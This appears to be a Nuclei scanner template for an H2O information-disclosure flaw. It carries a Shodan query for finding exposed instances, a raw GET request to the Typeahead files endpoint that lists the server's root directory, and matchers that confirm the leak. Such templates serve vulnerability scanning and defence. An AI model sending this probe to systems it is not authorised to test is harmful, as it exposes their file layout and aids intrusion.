id: h2o-arbitary-file-read
info:
  name: H2O - Arbitrary Path Lookup
  author: danmcinerney,byt3bl33d3r
  severity: medium
  description: |
    H2O allows for arbitrary path lookup via it's Typehead API endpoint
  reference:
    - https://huntr.com/bounties/e76372c2-39be-4984-a7c8-7048a75a25dc/
  classification:
    cwe-id: CWE-200
    cpe: cpe:2.3:a:h2o:h2o:*:*:*:*:*:*:*:*
  metadata:
    max-request: 1
    product: h2o
    shodan-query: title:"H2O Flow"
    vendor: h2o
    verified: true
  tags: h2o,h2o-3,info-leak,lfi,misconfig,vuln
http:
  - matchers:
      - condition: and
        part: body
        type: word
        words:
          - '"/bin"'
          - '"__meta":'
          - '"schema_name":'
      - part: header
        type: word
        words:
          - application/json
      - status:
          - 200
        type: status
    matchers-condition: and
    raw:
      - |
        GET /3/Typeahead/files?src=%2F&limit=10 HTTP/1.1
        Host: {{Hostname}}
